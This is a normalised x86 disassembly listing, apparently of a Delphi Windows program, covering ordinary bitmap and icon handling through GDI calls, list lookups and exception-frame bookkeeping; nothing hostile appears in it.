mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_42667f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_426150
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407ea8
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_42665c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426663
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026ec
retn
call sub_4258c0
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_42630c
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_426318
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_4266c8
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_425848
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cbc
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425af8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_4267ac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_4266c8
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_426818
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4266c8
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4268b5
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4268bc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_4268ec
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402cbc
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402cbc
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_4268e0
xor edx edx
push ebp
push sub_426ada
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4267ac
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4267ac
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426ab3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407ea8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407ea8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407ea8
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407ea8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_426818
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_426818
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426aba
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026ec
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026ec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026ec
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_426aba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ae1
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_426ae8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_426b38
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_426b90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_426b38
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426bd9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031f0
mov edi eax
mov eax esi
call sub_4031f0
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426d13
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426cf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407fd4
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cfd
mov al 0x1
sub_426d2c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b510
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426d74
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d7b
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_426d80
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_426db4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b510
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426dff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e06
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_426e30
push cs
or edx [ esi + eax * 2 + 0x69 ]
js r-xdata
popad
je r-xdata
insb
inc esi
outsd
jb r-xdata
inc ecx
add [ edi + eax * 4 - 0x77d7ffbf ] ch
inc ecx
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
movsb [ edi ] [ esi ]
outsb
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x100042 ] dh
add [ eax ] al
cmp [ eax + 0x41 ] ah
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bh
outsd
inc edx
add ah bh
mov [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov edx r-xdata
mov eax esi
call sub_427048
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_427048
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_427048
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426fac
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_426fa5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403278
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_427048
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_40360c
sub_426ec8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_426fa5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403278
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_427048
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_427048
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_427048
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_427048
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426fac
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
add esp 0xfffffff0
call sub_40360c
sub_427048
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4270cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404e0c
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4080a0
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_40408c
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_40408c
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_418778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4270d2
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_4270dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_427163
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4080a0
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4040d0
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_4188d4
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_404444
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42716a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_427174
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4271f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4188d4
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4031f8
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_40429c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404444
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4271f9
lea eax [ ebp - 0x8 ]
call sub_404038
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_427204
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427383
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_404038
mov eax [ ebp + 0x8 ]
call sub_404038
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_4034d4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42738a
lea eax [ ebp - 0x3c ]
call sub_404038
lea eax [ ebp - 0x10 ]
call sub_404038
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405df8
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_409130
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404300
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_404300
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_409130
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_409130
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_4086d0
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_40408c
sub_427450
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_4274fc
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_4274fc
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_4274fc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4274d0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a8
mov eax [ esi + 0x8 ]
call sub_4032a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4274fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_418778
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427540
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_418778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_427564
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_4188d4
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4188d4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4275e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
call sub_4275a0
call sub_4275c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_427620
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_427650
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4031f0
mov edx eax
mov eax [ ebx + 0xc ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419008
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_427684
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_403434
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4032a8
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
